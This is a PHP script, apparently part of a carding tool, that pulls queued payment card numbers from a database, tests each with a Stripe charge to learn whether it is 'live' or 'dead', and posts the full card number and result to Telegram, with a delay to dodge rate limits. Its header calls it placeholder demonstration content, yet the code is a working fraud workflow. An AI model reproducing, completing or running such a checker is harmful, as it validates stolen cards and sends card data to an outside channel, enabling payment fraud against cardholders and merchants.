// auto_checker.php - placeholder content for demonstration.
<?php
require 'config.php';
require 'stripe.php';

$config = require 'config.php';

// Connect to DB
$mysqli = new mysqli(
    $config['db']['host'],
    $config['db']['user'],
    $config['db']['pass'],
    $config['db']['name']
);

// Fetch cards from queue (not yet checked)
$result = $mysqli->query("SELECT * FROM card_queue WHERE status = 'pending' LIMIT 5");

if ($result->num_rows === 0) {
    echo "No cards to check.\n";
    exit;
}

while ($row = $result->fetch_assoc()) {
    $card = $row['card'];
    $id = $row['id'];

    echo "Checking card: $card\n";

    // Run Stripe test charge
    $response = checkCard($card); // From stripe.php

    // Update status
    $stmt = $mysqli->prepare("UPDATE card_queue SET status = ?, response = ?, checked_at = NOW() WHERE id = ?");
    $stmt->bind_param("ssi", $response['status'], $response['message'], $id);
    $stmt->execute();

    // Log to Telegram
    if ($response['status'] === 'live') {
        sendTelegramMessage("✅ Live Card: {$card}");
    } elseif ($response['status'] === 'dead') {
        sendTelegramMessage("❌ Dead Card: {$card}");
    }

    sleep(2); // Rate control between checks
}
?>
